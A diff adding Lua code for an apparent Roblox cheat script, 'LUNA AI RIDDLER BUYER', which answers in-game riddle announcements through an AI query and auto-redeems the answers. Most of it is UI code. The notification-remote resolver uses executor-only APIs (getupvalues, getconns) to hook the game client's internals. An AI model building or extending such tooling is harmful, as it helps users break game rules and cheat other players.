+    clean = clean:gsub("%s*,%s*", " and ")
+    clean = clean:gsub("%s+at%s+the%s+end", " ")
+    clean = clean:gsub("%s+at%s+the%s+start", " ")
+    local parts = {}
+    for part in (clean .. " and "):gmatch("(.-)%s+and%s+") do
+        part = trim(part)
+        if part ~= "" then parts[#parts + 1] = part end
+    end
+    if #parts == 0 then parts[1] = trim(text or "") end
+    return parts
+end
+
+-- ============================================================
+-- SOLVERS — single & multi
+-- ============================================================
+local solveRiddle
+local solveRiddleMulti
+do
+    -- ── single-answer path ──
+    local function resolvePart(part, cb)
+        local multiplier = extractTimesMultiplier(part)
+        local q = stripMultiplierText(part)
+        q = stripTrailingNumber(q)
+        q = q:gsub("%s+at%s+the%s+end%s*$", ""):gsub("%s+at%s+the%s+start%s*$", "")
+        q = trim(q)
+        if q == "" then return nil end
+        local onlyNum = q:match("^%d+$")
+        if onlyNum then return multiplier and string.rep(onlyNum, multiplier) or onlyNum end
+        local a = localExactAnswer(q)
+        if not a then
+            if cb then cb("AI: " .. q:sub(1, 40)) end
+            a = select(1, queryAI(q))
+        end
+        if not a then return nil end
+        local clean = tostring(a):upper():gsub("%s+", ""):gsub("[%?%.%,!\"'`]", "")
+        if clean:find("ATTHEEND") or clean:find("ATTHESTART") or clean == "AND" then return nil end
+        if clean == "" then return nil end
+        return multiplier and string.rep(clean, multiplier) or clean
+    end
+
+    solveRiddle = function(text, cb)
+        local suffix = text:match("%s*(%d+)%s*$") or text:match("%s*(%d+)[%.,;!?]%s*$")
+        local parts = splitAllParts(text)
+        local answers = {}
+        for _, part in ipairs(parts) do
+            local ok, result = pcall(resolvePart, part, cb)
+            if ok and result and result ~= "" then answers[#answers + 1] = result end
+        end
+        if #answers == 0 then
+            if cb then cb("AI full question") end
+            local a = select(1, queryAI(stripTrailingNumber(text)))
+            if a then
+                local clean = tostring(a):upper():gsub("%s+", ""):gsub("[%?%.%,!\"'`]", "")
+                clean = clean:gsub("ATTHEEND", ""):gsub("ATTHESTART", "")
+                if suffix and clean:sub(-#suffix) ~= suffix then clean = clean .. suffix end
+                return clean
+            end
+            return nil, "no answer"
+        end
+        local out = table.concat(answers, "")
+        if suffix and out:sub(-#suffix) ~= suffix then out = out .. suffix end
+        return out
+    end
+
+    -- ── multi-answer path (used when SECURE ANSWER is on) ──
+    local function resolvePartMulti(part, cb)
+        local multiplier = extractTimesMultiplier(part)
+        local q = stripMultiplierText(part)
+        q = stripTrailingNumber(q)
+        q = q:gsub("%s+at%s+the%s+end%s*$", ""):gsub("%s+at%s+the%s+start%s*$", "")
+        q = trim(q)
+        if q == "" then return nil end
+        local onlyNum = q:match("^%d+$")
+        if onlyNum then
+            local v = multiplier and string.rep(onlyNum, multiplier) or onlyNum
+            return { v }
+        end
+        -- try local (single OR multi)
+        local candidates = localExactAnswers(q)
+        if candidates then
+            local out = {}
+            for _, a in ipairs(candidates) do
+                local clean = tostring(a):upper():gsub("%s+", ""):gsub("[%?%.%,!\"'`]", "")
+                if clean ~= "" and not clean:find("ATTHEEND") and not clean:find("ATTHESTART") and clean ~= "AND" then
+                    out[#out + 1] = multiplier and string.rep(clean, multiplier) or clean
+                end
+            end
+            if #out > 0 then return out end
+        end
+        -- fall back to AI (single answer)
+        if cb then cb("AI: " .. q:sub(1, 40)) end
+        local a = select(1, queryAI(q))
+        if not a then return nil end
+        local clean = tostring(a):upper():gsub("%s+", ""):gsub("[%?%.%,!\"'`]", "")
+        if clean == "" or clean:find("ATTHEEND") or clean:find("ATTHESTART") then return nil end
+        return { multiplier and string.rep(clean, multiplier) or clean }
+    end
+
+    solveRiddleMulti = function(text, cb)
+        local suffix = text:match("%s*(%d+)%s*$") or text:match("%s*(%d+)[%.,;!?]%s*$")
+        local parts = splitAllParts(text)
+
+        -- collect candidate list per part
+        local partLists = {}
+        for _, part in ipairs(parts) do
+            local ok, result = pcall(resolvePartMulti, part, cb)
+            if ok and result and #result > 0 then
+                partLists[#partLists + 1] = result
+            end
+        end
+
+        if #partLists == 0 then
+            -- fall back to AI full question (single answer)
+            if cb then cb("AI full question") end
+            local a = select(1, queryAI(stripTrailingNumber(text)))
+            if a then
+                local clean = tostring(a):upper():gsub("%s+", ""):gsub("[%?%.%,!\"'`]", "")
+                clean = clean:gsub("ATTHEEND", ""):gsub("ATTHESTART", "")
+                if suffix and clean:sub(-#suffix) ~= suffix then clean = clean .. suffix end
+                return { clean }
+            end
+            return nil, "no answer"
+        end
+
+        -- Cartesian product across parts (capped at 12 to prevent explosion)
+        local combos = { "" }
+        for _, list in ipairs(partLists) do
+            local newCombos = {}
+            for _, prefix in ipairs(combos) do
+                for _, ans in ipairs(list) do
+                    newCombos[#newCombos + 1] = prefix .. ans
+                end
+            end
+            combos = newCombos
+            if #combos > 12 then
+                local trimmed = {}
+                for i = 1, 12 do trimmed[i] = combos[i] end
+                combos = trimmed
+            end
+        end
+
+        -- dedupe + apply suffix
+        local seen = {}
+        local out = {}
+        for _, c in ipairs(combos) do
+            if suffix and c:sub(-#suffix) ~= suffix then c = c .. suffix end
+            if not seen[c] then
+                seen[c] = true
+                out[#out + 1] = c
+            end
+        end
+        return out
+    end
+end
+
+-- ============================================================
+-- NOTIFY REMOTE RESOLVER
+-- ============================================================
+local function resolveNotifyRemote()
+    if _G.PhiNotifyRemote and typeof(_G.PhiNotifyRemote) == "Instance" then
+        return _G.PhiNotifyRemote
+    end
+    if env.RiddlerNotifyRemote and typeof(env.RiddlerNotifyRemote) == "Instance" then
+        return env.RiddlerNotifyRemote
+    end
+
+    local ok, controller = pcall(function()
+        local controllers = RS:FindFirstChild("Controllers")
+        local n = controllers and controllers:FindFirstChild("NotificationController", true)
+        if n then return require(n) end
+    end)
+    if ok and type(controller) == "table" and type(controller.Start) == "function" and getupvalues then
+        local vOk, values = pcall(getupvalues, controller.Start)
+        if vOk and type(values) == "table" then
+            for _, v in pairs(values) do
+                if typeof(v) == "Instance"
+                    and (v:IsA("RemoteEvent") or v:IsA("RemoteFunction") or v:IsA("UnreliableRemoteEvent"))
+                then return v end
+            end
+        end
+    end
+
+    local pkg = RS:FindFirstChild("Packages")
+    if pkg and getconns and debug then
+        local getinfo = debug.getinfo or debug.info
+        local containers = {}
+        local netA = pkg:FindFirstChild("Net")
+        if netA then table.insert(containers, netA) end
+        local netB = pkg:FindFirstChild("Network")
+        if netB then table.insert(containers, netB) end
+        for _, net in ipairs(containers) do
+            for _, d in ipairs(net:GetDescendants()) do
+                if d:IsA("RemoteEvent") or d:IsA("UnreliableRemoteEvent") then
+                    local cOk, cs = pcall(getconns, d.OnClientEvent)
+                    if cOk and type(cs) == "table" then
+                        for _, c in ipairs(cs) do
+                            local f, fn = pcall(function() return c.Function end)
+                            if f and type(fn) == "function" then
+                                local i, info = pcall(getinfo, fn)
+                                local src = i and tostring(info.short_src or info.source or "") or ""
+                                if src:find("NotificationController", 1, true) then
+                                    return d
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+
+-- ============================================================
+-- STATE
+-- ============================================================
+local state = {
+    enabled         = false,
+    listening       = false,
+    autoRedeem      = true,
+    secureAnswer    = true,   -- try ALL candidate answers when a riddle has more than one
+    autoCopy        = true,
+    openFeedOnHit   = true,
+    autoListen      = true,
+    ignoreSystem    = true,
+    duoCount        = 0,
+    uiScale         = "TINY",
+    model           = "FAST",
+    palette         = "BLUE",
+}
+
+-- ============================================================
+-- ROOT GUI
+-- ============================================================
+local old = PG:FindFirstChild("RiddlerUI"); if old then old:Destroy() end
+local SG = new("ScreenGui", {
+    Name = "RiddlerUI",
+    ResetOnSpawn = false,
+    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+    DisplayOrder = 250,
+    IgnoreGuiInset = true,
+}, PG)
+
+-- ============================================================
+-- HEAD BILLBOARD — "LUNA AI RIDDLER BUYER"
+-- ============================================================
+local headTag = nil
+
+local function buildHeadTag(head)
+    local stale = head:FindFirstChild("LunaTag")
+    if stale then stale:Destroy() end
+
+    local bb = new("BillboardGui", {
+        Name = "LunaTag",
+        Size = UDim2.fromOffset(260, 56),
+        StudsOffsetWorldSpace = Vector3.new(0, 3.4, 0),
+        AlwaysOnTop = true,
+        LightInfluence = 0,
+        MaxDistance = 300,
+        ResetOnSpawn = false,
+        ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+    }, head)
+
+    local frame = new("Frame", {
+        Name = "TagFrame",
+        Size = UDim2.fromScale(1, 1),
+        BackgroundColor3 = C.bg,
+        BackgroundTransparency = 0.1,
+        BorderSizePixel = 0,
+    }, bb)
+    corner(frame, 14)
+    stroke(frame, C.line, 1.5, 0.1)
+    gradient(frame, C.acc2, C.accHi, 90)
+
+    local glow = new("Frame", {
+        Name = "TagGlow",
+        Size = UDim2.new(1, 14, 1, 14),
+        Position = UDim2.new(0, -7, 0, -7),
+        BackgroundColor3 = C.acc,
+        BackgroundTransparency = 0.82,
+        BorderSizePixel = 0,
+        ZIndex = 0,
+    }, bb)
+    corner(glow, 16)
+
+    local accentL = new("Frame", {
+        Name = "AccentL",
+        Size = UDim2.fromOffset(4, 30),
+        Position = UDim2.new(0, 10, 0.5, -15),
+        BackgroundColor3 = C.accHi,
+        BorderSizePixel = 0,
+    }, frame)
+    corner(accentL, 2)
+    gradient(accentL, C.acc, C.accHi, 90)
+
+    local accentR = new("Frame", {
+        Name = "AccentR",
+        Size = UDim2.fromOffset(4, 30),
+        Position = UDim2.new(1, -14, 0.5, -15),
+        BackgroundColor3 = C.accHi,
+        BorderSizePixel = 0,
+    }, frame)
+    corner(accentR, 2)
+    gradient(accentR, C.accHi, C.acc, 90)
+
+    local title = new("TextLabel", {
+        Name = "TagTitle",
+        Size = UDim2.new(1, -44, 1, 0),
+        Position = UDim2.fromOffset(22, 0),
+        BackgroundTransparency = 1,
+        Text = "LUNA AI RIDDLER BUYER",
+        TextColor3 = Color3.fromRGB(240, 245, 255),
+        Font = FBK,
+        TextSize = 15,
+        TextXAlignment = Enum.TextXAlignment.Center,
+        TextYAlignment = Enum.TextYAlignment.Center,
+        TextStrokeTransparency = 0.5,
+        TextStrokeColor3 = C.bgDeep,
+    }, frame)
+    gradient(title, Color3.fromRGB(230, 240, 255), C.accHi, 90)
+
+    headTag = {
+        billboard = bb,
+        frame = frame,
+        glow = glow,
+        accentL = accentL,
+        accentR = accentR,
+        title = title,
+    }
+    return headTag
+end
+
+local function updateHeadTagColors()
+    if not headTag then return end
+    headTag.frame.BackgroundColor3 = C.bg
+    local g = headTag.frame:FindFirstChildOfClass("UIGradient")
+    if g then g:Destroy() end
+    gradient(headTag.frame, C.acc2, C.accHi, 90)
+    local s = headTag.frame:FindFirstChildOfClass("UIStroke")
+    if s then s.Color = C.line end
+    headTag.glow.BackgroundColor3 = C.acc
+    headTag.accentL.BackgroundColor3 = C.accHi
+    headTag.accentR.BackgroundColor3 = C.accHi
+    local gl = headTag.accentL:FindFirstChildOfClass("UIGradient")
+    if gl then gl:Destroy() end
+    gradient(headTag.accentL, C.acc, C.accHi, 90)
+    local gr = headTag.accentR:FindFirstChildOfClass("UIGradient")
+    if gr then gr:Destroy() end
+    gradient(headTag.accentR, C.accHi, C.acc, 90)
+    headTag.title.TextStrokeColor3 = C.bgDeep
+    local tg = headTag.title:FindFirstChildOfClass("UIGradient")
+    if tg then tg:Destroy() end
+    gradient(headTag.title, Color3.fromRGB(230, 240, 255), C.accHi, 90)
+end
+
+local function attachHeadTag(character)
+    local head = character:WaitForChild("Head", 10)
+    if head then buildHeadTag(head) end
+end
+
+if LP.Character then task.spawn(attachHeadTag, LP.Character) end
+LP.CharacterAdded:Connect(attachHeadTag)
+
+-- ============================================================
+-- MAIN WINDOW  (BOTTOM-CENTER OF SCREEN)
+-- ============================================================
+local WIN_W, WIN_H = 320, 560
+local Main = new("Frame", {
+    Name = "Main",
+    AnchorPoint = Vector2.new(0.5, 1),
+    Size = UDim2.fromOffset(WIN_W, WIN_H),
+    Position = UDim2.new(0.5, 0, 1, -12),
+    BackgroundColor3 = C.bg,
+    BorderSizePixel = 0,
+    ClipsDescendants = true,
+    Active = true,
+    ZIndex = 1,
+}, SG)
+corner(Main, 12)
+gradient(Main, C.header, C.bg, 90)
+stroke(Main, C.line, 1, 0.35)
+
+-- slide-in from the bottom
+Main.Position = UDim2.new(0.5, 0, 1, WIN_H + 40)
+tween(Main, 0.55, { Position = UDim2.new(0.5, 0, 1, -12) }, Enum.EasingStyle.Quint)
+
+-- ============================================================
+-- RAIN BACKGROUND
+-- ============================================================
+local RainFrame = new("Frame", {
+    Name = "RainFrame",
+    Size = UDim2.fromScale(1, 1),
+    BackgroundTransparency = 1,
+    ZIndex = 1,
+    ClipsDescendants = true,
+}, Main)
+corner(RainFrame, 12)
+
+local drops = {}
+local RAIN_COUNT = 70
+for i = 1, RAIN_COUNT do
+    local drop = new("Frame", {
+        Size = UDim2.fromOffset(math.random(1, 2), math.random(6, 16)),
+        Position = UDim2.new(math.random(), 0, math.random(), 0),
+        BackgroundColor3 = C.rain,
+        BackgroundTransparency = math.random(35, 75) / 100,
+        BorderSizePixel = 0,
+        ZIndex = 1,
+    }, RainFrame)
+    corner(drop, 1)
+    drops[i] = {
+        frame = drop,
+        speed = math.random(8, 25) / 10,
+        startY = math.random(),
+    }
+end
+
+RunService.RenderStepped:Connect(function(dt)
+    for _, d in ipairs(drops) do
+        if d.frame and d.frame.Parent then
+            local pos = d.frame.Position
+            local newY = pos.Y.Scale + d.speed * dt
+            if newY > 1 then
+                newY = -0.05
+                d.frame.Position = UDim2.new(math.random(), 0, newY, 0)
+                d.frame.BackgroundTransparency = math.random(35, 75) / 100
+                d.frame.Size = UDim2.fromOffset(math.random(1, 2), math.random(6, 16))
+            else
+                d.frame.Position = UDim2.new(pos.X.Scale, 0, newY, 0)
+            end
+        end
+    end
+end)
+
+local InterfaceScale = new("UIScale", { Scale = 0.42 }, Main)
+
+-- HEADER
+local Header = new("Frame", {
+    Size = UDim2.new(1, 0, 0, 42),
+    BackgroundColor3 = C.header,
+    BorderSizePixel = 0,
+    ZIndex = 2,
+}, Main)
+corner(Header, 12)
+new("Frame", { Size = UDim2.new(1,0,0,12), Position = UDim2.new(0,0,1,-12), BackgroundColor3 = C.header, BorderSizePixel = 0, ZIndex = 2 }, Header)
+
+local Logo = new("Frame", {
+    Size = UDim2.fromOffset(24, 24),
+    Position = UDim2.fromOffset(10, 9),
+    BackgroundColor3 = C.acc,
+    BorderSizePixel = 0,
+    ZIndex = 3,
+}, Header)
+corner(Logo, 12)
+gradient(Logo, C.acc2, C.accHi, 45)
+stroke(Logo, C.accHi, 1, 0.35)
+local LogoLbl = label("L", 12, Color3.fromRGB(255,255,255), FBK, Enum.TextXAlignment.Center, Logo)
+LogoLbl.Size = UDim2.fromScale(1,1); LogoLbl.Position = UDim2.fromScale(0,0)
+LogoLbl.ZIndex = 4
+
+local Brand = label("RIDDLER", 14, C.txt, FBK, Enum.TextXAlignment.Left, Header)
+Brand.Size = UDim2.new(0, 110, 0, 18)
+Brand.Position = UDim2.fromOffset(42, 6)
+Brand.ZIndex = 3
+
+local StatusDot = new("Frame", {
+    Size = UDim2.fromOffset(6, 6),
+    Position = UDim2.fromOffset(42, 28),
+    BackgroundColor3 = C.sub,
+    BorderSizePixel = 0,
+    ZIndex = 3,
+}, Header)
+corner(StatusDot, 3)
+local HeaderStatus = label("ready", 8, C.sub, FM, Enum.TextXAlignment.Left, Header)
+HeaderStatus.Size = UDim2.new(0, 120, 0, 10)
+HeaderStatus.Position = UDim2.fromOffset(54, 26)
+HeaderStatus.ZIndex = 3
+
+-- Tabs
+local tabs = {"Test","Feed","Settings"}
+local TabButtons = {}
+local TabsFrame = new("Frame", {
+    Size = UDim2.new(0, 108, 0, 22),
+    Position = UDim2.new(1, -148, 0, 10),
+    BackgroundTransparency = 1,
+    ZIndex = 3,
+}, Header)
+for i, name in ipairs(tabs) do
+    local b = new("TextButton", {
+        Size = UDim2.new(1/3, -2, 1, 0),
+        Position = UDim2.new((i-1)/3, 1, 0, 0),
+        BackgroundColor3 = C.panel,
+        Text = name, TextSize = 9, Font = FB, TextColor3 = C.sub,
+        AutoButtonColor = false, BorderSizePixel = 0,
+        ZIndex = 4,
+    }, TabsFrame)
+    corner(b, 5)
+    TabButtons[name] = b
+end
+
+-- MINIMIZE BUTTON
+local MinimizeBtn = new("TextButton", {
+    Name = "Minimize",
+    Size = UDim2.fromOffset(26, 22),
+    Position = UDim2.new(1, -36, 0, 10),
+    BackgroundColor3 = C.panel,
+    Text = "—", TextSize = 12, Font = FBK, TextColor3 = C.txt,
+    AutoButtonColor = false, BorderSizePixel = 0,
+    ZIndex = 3,
+}, Header)
+corner(MinimizeBtn, 5)
+stroke(MinimizeBtn, C.lineSoft, 1, 0.4)
+
+drag(Header, Main)
+
+local Content = new("Frame", {
+    Size = UDim2.new(1, 0, 1, -42),
+    Position = UDim2.fromOffset(0, 42),
+    BackgroundTransparency = 1,
+    ZIndex = 3,
+}, Main)
+
+local TestPage     = new("Frame", { Size = UDim2.fromScale(1,1), BackgroundTransparency = 1, Visible = true, ZIndex = 3 }, Content)
+local FeedPage     = new("Frame", { Size = UDim2.fromScale(1,1), BackgroundTransparency = 1, Visible = false, ZIndex = 3 }, Content)
+local SettingsPage = new("Frame", { Size = UDim2.fromScale(1,1), BackgroundTransparency = 1, Visible = false, ZIndex = 3 }, Content)
+
+local function setActiveTab(name)
+    for n, b in pairs(TabButtons) do
+        if n == name then
+            b.BackgroundColor3 = C.acc
+            b.TextColor3 = Color3.fromRGB(255,255,255)
+        else
+            b.BackgroundColor3 = C.panel
+            b.TextColor3 = C.sub
+        end
+    end
+    TestPage.Visible     = (name == "Test")
+    FeedPage.Visible     = (name == "Feed")
+    SettingsPage.Visible = (name == "Settings")
+end
+for name, b in pairs(TabButtons) do
+    b.MouseButton1Click:Connect(function() setActiveTab(name) end)
+end
+
+local minimized = false
+MinimizeBtn.MouseButton1Click:Connect(function()
+    minimized = not minimized
+    if minimized then
+        tween(Main, 0.2, { Size = UDim2.fromOffset(WIN_W, 42) })
+        MinimizeBtn.Text = "+"
+    else
+        tween(Main, 0.2, { Size = UDim2.fromOffset(WIN_W, WIN_H) })
+        MinimizeBtn.Text = "—"
+    end
+end)
+
+-- ============================================================
+-- PILL ROW
+-- ============================================================
+local function makePillRow(parent, yOffset, labelText, init, onChange)
+    local row = new("Frame", {
+        Size = UDim2.new(1, -20, 0, 40),
+        Position = UDim2.fromOffset(10, yOffset),
+        BackgroundColor3 = C.panel, BorderSizePixel = 0,
+        ZIndex = 4,
+    }, parent)
+    corner(row, 8); stroke(row, C.lineSoft, 1, 0.55)
+
+    local lbl = label(labelText, 11, C.txt, FBK, Enum.TextXAlignment.Left, row)
+    lbl.Size = UDim2.new(1, -70, 1, 0)
+    lbl.Position = UDim2.fromOffset(14, 0)
+    lbl.ZIndex = 5
+
+    local track = new("Frame", {
+        Size = UDim2.fromOffset(46, 22),
+        Position = UDim2.new(1, -58, 0.5, -11),
+        BackgroundColor3 = init and C.acc or C.toggleOff,
+        BorderSizePixel = 0,
+        ZIndex = 5,
+    }, row)
+    corner(track, 11)
+    if init then gradient(track, C.acc2, C.acc, 90) end
+
+    local knob = new("Frame", {
+        Size = UDim2.fromOffset(18, 18),
+        Position = init and UDim2.new(1, -20, 0.5, -9) or UDim2.fromOffset(2, 2),
+        BackgroundColor3 = Color3.fromRGB(255,255,255),
+        BorderSizePixel = 0,
+        ZIndex = 6,
+    }, track)
+    corner(knob, 9)
+
+    local btn = new("TextButton", { Size = UDim2.fromScale(1,1), BackgroundTransparency = 1, Text = "", ZIndex = 7 }, track)
+
+    local s = init
+    local function set(v)
+        if v == s then return end
+        s = v
+        track.BackgroundColor3 = s and C.acc or C.toggleOff
+        knob.Position = s and UDim2.new(1, -20, 0.5, -9) or UDim2.fromOffset(2, 2)
+        if s then
+            if not track:FindFirstChildOfClass("UIGradient") then gradient(track, C.acc2, C.acc, 90) end
+        else
+            local g = track:FindFirstChildOfClass("UIGradient"); if g then g:Destroy() end
+        end
+        if onChange then onChange(s) end
+    end
+    btn.MouseButton1Click:Connect(function() set(not s) end)
+    return row, set
+end
+
+-- ============================================================
+-- BUTTON HELPERS
+-- ============================================================
+local function ghostBtn(text, parent)
+    local b = new("TextButton", {
+        BackgroundColor3 = C.panel2, Text = text, Font = FB, TextSize = 10, TextColor3 = C.txt,
+        AutoButtonColor = false, BorderSizePixel = 0,
+        ZIndex = 4,
+    }, parent)
+    corner(b, 6); local s = stroke(b, C.lineSoft, 1, 0.4)
+    b.MouseEnter:Connect(function() tween(b, 0.12, { BackgroundColor3 = C.panel }); tween(s, 0.12, { Color = C.acc, Transparency = 0.2 }) end)
+    b.MouseLeave:Connect(function() tween(b, 0.12, { BackgroundColor3 = C.panel2 }); tween(s, 0.12, { Color = C.lineSoft, Transparency = 0.4 }) end)
+    return b
+end
+local function accentBtn(text, parent)
+    local b = new("TextButton", {
+        BackgroundColor3 = C.acc, Text = text, Font = FBK, TextSize = 11, TextColor3 = Color3.fromRGB(255,255,255),
+        AutoButtonColor = false, BorderSizePixel = 0,
+        ZIndex = 4,
+    }, parent)
+    corner(b, 6); gradient(b, C.acc2, C.acc, 90)
+    b.MouseEnter:Connect(function() tween(b, 0.12, { BackgroundColor3 = C.accHi }) end)
+    b.MouseLeave:Connect(function() tween(b, 0.12, { BackgroundColor3 = C.acc }) end)
+    return b
+end
+local function segmented(parent, options, initial, onSelect, fillWidth)
+    local cont = new("Frame", {
+        Size = fillWidth or UDim2.new(1,0,1,0),
+        BackgroundTransparency = 1,
+        ZIndex = 4,
+    }, parent)
+    local btns = {}
+    for i, opt in ipairs(options) do
+        local b = new("TextButton", {
+            Size = UDim2.new(1/#options, -3, 1, 0),
+            Position = UDim2.new((i-1)/#options, 0, 0, 0),
+            BackgroundColor3 = (opt == initial) and C.acc or C.panel2,
+            Text = opt, TextSize = 9, Font = FBK,
+            TextColor3 = (opt == initial) and Color3.fromRGB(255,255,255) or C.sub,
+            AutoButtonColor = false, BorderSizePixel = 0,
+            ZIndex = 5,
+        }, cont)
+        corner(b, 6)
+        if opt == initial then gradient(b, C.acc2, C.acc, 90) end
+        btns[opt] = b
+        b.MouseButton1Click:Connect(function()
+            for o, btn in pairs(btns) do
+                if o == opt then
+                    btn.BackgroundColor3 = C.acc
+                    btn.TextColor3 = Color3.fromRGB(255,255,255)
+                    if not btn:FindFirstChildOfClass("UIGradient") then gradient(btn, C.acc2, C.acc, 90) end
+                else
+                    btn.BackgroundColor3 = C.panel2
+                    btn.TextColor3 = C.sub
+                    local g = btn:FindFirstChildOfClass("UIGradient"); if g then g:Destroy() end
+                end
+            end
+            if onSelect then onSelect(opt) end
+        end)
+    end
+    return cont
+end
+
+-- ============================================================
+-- TEST PAGE
+-- ============================================================
+local TestScroll = new("ScrollingFrame", {
+    Name = "TestScroll",
+    Size = UDim2.fromScale(1, 1),
+    Position = UDim2.fromOffset(0, 0),
+    BackgroundTransparency = 1,
+    BorderSizePixel = 0,
+    CanvasSize = UDim2.new(0, 0, 0, 0),
+    AutomaticCanvasSize = Enum.AutomaticSize.Y,
+    ScrollBarThickness = 4,
+    ScrollBarImageColor3 = C.acc,
+    ScrollBarImageTransparency = 0.35,
+    ScrollingDirection = Enum.ScrollingDirection.Y,
+    ElasticBehavior = Enum.ElasticBehavior.WhenScrollable,
+    VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar,
+    Active = true,
+    ZIndex = 4,
+}, TestPage)
+
+local ReadyRow = new("Frame", {
+    Size = UDim2.new(1, -20, 0, 22),
+    Position = UDim2.fromOffset(10, 6),
+    BackgroundTransparency = 1,
+    ZIndex = 4,
+}, TestScroll)
+local ReadyDot = new("Frame", {
+    Size = UDim2.fromOffset(7, 7),
+    Position = UDim2.fromOffset(4, 7),
+    BackgroundColor3 = C.ok, BorderSizePixel = 0,
+    ZIndex = 5,
+}, ReadyRow)
+corner(ReadyDot, 4)
+local ReadyText = label("ready - notify mapped", 11, C.ok, FB, Enum.TextXAlignment.Left, ReadyRow)
+ReadyText.Size = UDim2.new(1, -22, 1, 0)
+ReadyText.Position = UDim2.fromOffset(18, 0)
+ReadyText.ZIndex = 5
+
+local aiSet, listenSet
+do
+    local _, s = makePillRow(TestScroll, 32, "AI", state.enabled, function(v) state.enabled = v end)
+    aiSet = s
+    local _, s2 = makePillRow(TestScroll, 74, "LISTEN", state.listening, function(v) state.listening = v end)
+    listenSet = s2
+end
+
+local QLabel = label("QUESTION", 9, C.accHi, FBK, Enum.TextXAlignment.Left, TestScroll)
+QLabel.Size = UDim2.new(1, -20, 0, 12)
+QLabel.Position = UDim2.fromOffset(14, 122)
+QLabel.ZIndex = 5
+
+local QBox = new("Frame", {
+    Size = UDim2.new(1, -20, 0, 44),
+    Position = UDim2.fromOffset(10, 136),
+    BackgroundColor3 = C.input, BorderSizePixel = 0,
+    ZIndex = 4,
+}, TestScroll)
+corner(QBox, 8); stroke(QBox, C.lineSoft, 1, 0.4)
+
+local QText = label("waiting for announcement...", 11, C.dim, FM, Enum.TextXAlignment.Left, QBox)
+QText.Size = UDim2.new(1, -16, 1, -8)
+QText.Position = UDim2.fromOffset(8, 4)
+QText.TextWrapped = true
+QText.TextYAlignment = Enum.TextYAlignment.Top
+QText.ZIndex = 5
+
+local ALabel = label("ANSWER (CODE)", 9, C.accHi, FBK, Enum.TextXAlignment.Left, TestScroll)
+ALabel.Size = UDim2.new(1, -20, 0, 12)
+ALabel.Position = UDim2.fromOffset(14, 186)
+ALabel.ZIndex = 5
+
+local ABox = new("Frame", {
+    Size = UDim2.new(1, -20, 0, 40),
+    Position = UDim2.fromOffset(10, 200),
+    BackgroundColor3 = C.input, BorderSizePixel = 0,
+    ZIndex = 4,
+}, TestScroll)
+corner(ABox, 8); stroke(ABox, C.lineSoft, 1, 0.4)
+
+local AnswerInput = new("TextBox", {
+    Size = UDim2.new(1, -16, 1, 0),
+    Position = UDim2.fromOffset(8, 0),
+    BackgroundTransparency = 1,
+    Text = "",
+    PlaceholderText = "answer appears here...",
+    PlaceholderColor3 = C.dim,
+    TextColor3 = C.txt,
+    TextSize = 12, Font = FM,
+    TextXAlignment = Enum.TextXAlignment.Left,
+    TextYAlignment = Enum.TextYAlignment.Center,
+    ClearTextOnFocus = false,
+    ZIndex = 5,
+}, ABox)
+
+local BtnRow = new("Frame", {
+    Size = UDim2.new(1, -20, 0, 34),
+    Position = UDim2.fromOffset(10, 246),
+    BackgroundTransparency = 1,
+    ZIndex = 4,
+}, TestScroll)
+
+local CopyBtn = ghostBtn("COPY", BtnRow)
+CopyBtn.Size = UDim2.new(0.30, -4, 1, 0); CopyBtn.Position = UDim2.new(0, 0, 0, 0)
+local ClearBtn = ghostBtn("CLEAR", BtnRow)
+ClearBtn.Size = UDim2.new(0.30, -4, 1, 0); ClearBtn.Position = UDim2.new(0.315, 0, 0, 0)
+local RedeemBtn = accentBtn("REDEEM", BtnRow)
+RedeemBtn.Size = UDim2.new(0.37, 0, 1, 0); RedeemBtn.Position = UDim2.new(0.63, 0, 0, 0)
+
+local yBase = 288
+local gap = 42
+makePillRow(TestScroll, yBase + 0*gap, "AUTO REDEEM ANSWER",  state.autoRedeem,     function(v) state.autoRedeem = v end)
+makePillRow(TestScroll, yBase + 1*gap, "SECURE ANSWER (1-3)", state.secureAnswer,   function(v) state.secureAnswer = v end)
+makePillRow(TestScroll, yBase + 2*gap, "AUTO COPY ANSWER",    state.autoCopy,       function(v) state.autoCopy = v end)
+makePillRow(TestScroll, yBase + 3*gap, "OPEN FEED ON HIT",    state.openFeedOnHit,  function(v) state.openFeedOnHit = v end)
+
+local TestSizeRow = new("Frame", {
+    Size = UDim2.new(1, -20, 0, 42),
+    Position = UDim2.fromOffset(10, yBase + 4*gap + 2),
+    BackgroundColor3 = C.panel, BorderSizePixel = 0,
+    ZIndex = 4,
+}, TestScroll)
+corner(TestSizeRow, 8); stroke(TestSizeRow, C.lineSoft, 1, 0.55)
+local TestSizeLbl = label("UI SIZE", 11, C.txt, FBK, Enum.TextXAlignment.Left, TestSizeRow)
+TestSizeLbl.Size = UDim2.new(0, 70, 1, 0); TestSizeLbl.Position = UDim2.fromOffset(14, 0)
+TestSizeLbl.ZIndex = 5
+
+local TestSizeArea = new("Frame", {
+    Size = UDim2.new(0, 190, 0, 26),
+    Position = UDim2.new(1, -200, 0.5, -13),
+    BackgroundTransparency = 1,
+    ZIndex = 4,
+}, TestSizeRow)
+
+local uiSizeControls = {}
+local uiSizeControl = segmented(TestSizeArea, {"BIG","MEDIUM","SMALL","TINY"}, state.uiScale, function(v)
+    state.uiScale = v
+    local s = (v == "BIG") and 1 or (v == "MEDIUM") and 0.85 or (v == "SMALL") and 0.72 or 0.42
+    tween(InterfaceScale, 0.2, { Scale = s })
+end)
+uiSizeControls[1] = uiSizeControl
+
+local SenderBtn = accentBtn("TEST SENDER", TestScroll)
+SenderBtn.Size = UDim2.new(1, -20, 0, 34)
+SenderBtn.Position = UDim2.fromOffset(10, yBase + 4*gap + 52)
+
+-- ============================================================
+-- FEED PAGE
+-- ============================================================
+local FeedHeader = new("Frame", {
+    Size = UDim2.new(1, -20, 0, 34),
+    Position = UDim2.fromOffset(10, 8),
+    BackgroundTransparency = 1,
+    ZIndex = 4,
+}, FeedPage)
+
+local SolvePill = new("Frame", {
+    Size = UDim2.fromOffset(66, 22),
+    Position = UDim2.fromOffset(0, 6),
+    BackgroundColor3 = C.panel, BorderSizePixel = 0,
+    ZIndex = 4,
+}, FeedHeader)
+corner(SolvePill, 11); stroke(SolvePill, C.lineSoft, 1, 0.4)
